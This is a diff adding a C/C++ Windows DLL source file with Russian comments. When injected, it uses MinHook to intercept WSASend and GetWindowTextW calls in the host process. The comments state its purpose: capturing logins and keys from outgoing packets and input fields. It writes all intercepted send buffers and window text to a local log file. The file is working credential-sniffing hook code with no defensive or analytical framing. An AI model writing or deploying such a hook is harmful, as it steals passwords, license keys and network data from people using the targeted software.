@@ -1,0 +1,81 @@
+// MinHook подключается как отдельный проект или через includes!
+#include <windows.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <MinHook.h>
+#include <stdio.h>
+
+// Prototypes
+typedef int (WINAPI* WSASend_t)(SOCKET, LPWSABUF, DWORD, LPDWORD, DWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE);
+typedef int (WINAPI* GetWindowTextW_t)(HWND, LPWSTR, int);
+
+// Pointers to originals
+WSASend_t fpWSASend = NULL;
+GetWindowTextW_t fpGetWindowTextW = NULL;
+
+// Log helper
+void LogData(const char* tag, const void* data, size_t length) {
+    FILE* f = fopen("C:\\hook_auth_log.txt", "a+b");
+    if (f) {
+        fprintf(f, "[%s] len=%zu\n", tag, length);
+        fwrite(data, 1, length, f);
+        fputc('\n', f);
+        fclose(f);
+    }
+}
+
+// WSASend hook: логирует отправляемые данные (обычно логин/ключ отправляют первым пакетом)
+int WINAPI WSASend_Hook(
+    SOCKET s,
+    LPWSABUF lpBuffers,
+    DWORD dwBufferCount,
+    LPDWORD lpNumberOfBytesSent,
+    DWORD dwFlags,
+    LPWSAOVERLAPPED lpOverlapped,
+    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
+) {
+    for (DWORD i = 0; i < dwBufferCount; ++i) {
+        LogData("WSASend", lpBuffers[i].buf, lpBuffers[i].len);
+    }
+    // Call original
+    return fpWSASend(s, lpBuffers, dwBufferCount, lpNumberOfBytesSent, dwFlags, lpOverlapped, lpCompletionRoutine);
+}
+
+// GetWindowTextW hook: логирует текст полей ввода, например ключа или логина
+int WINAPI GetWindowTextW_Hook(HWND hWnd, LPWSTR lpString, int nMaxCount) {
+    int ret = fpGetWindowTextW(hWnd, lpString, nMaxCount);
+    if(ret > 0) {
+        char data[512];
+        int len = WideCharToMultiByte(CP_UTF8, 0, lpString, ret, data, sizeof(data)-1, 0, 0);
+        if(len > 0) {
+            data[len] = 0;
+            LogData("GetWindowTextW", data, len);
+        }
+    }
+    return ret;
+}
+
+// DLL Entry Point: ставит хуки
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    if(ul_reason_for_call == DLL_PROCESS_ATTACH) {
+        MH_Initialize();
+        // WSASend hook (для сетевых пакетов)
+        HMODULE ws2_32 = GetModuleHandleW(L"ws2_32.dll");
+        if (ws2_32) {
+            void* pWSASend = GetProcAddress(ws2_32, "WSASend");
+            MH_CreateHook(pWSASend, &WSASend_Hook, reinterpret_cast<LPVOID*>(&fpWSASend));
+            MH_EnableHook(pWSASend);
+        }
+        // GetWindowTextW hook (для GUI поля)
+        HMODULE user32 = GetModuleHandleW(L"user32.dll");
+        if(user32) {
+            void* pGetWindowTextW = GetProcAddress(user32, "GetWindowTextW");
+            MH_CreateHook(pGetWindowTextW, &GetWindowTextW_Hook, reinterpret_cast<LPVOID*>(&fpGetWindowTextW));
+            MH_EnableHook(pGetWindowTextW);
+        }
+    }
+    else if (ul_reason_for_call == DLL_PROCESS_DETACH) {
+        MH_Uninitialize();
+    }
+    return TRUE;
+}
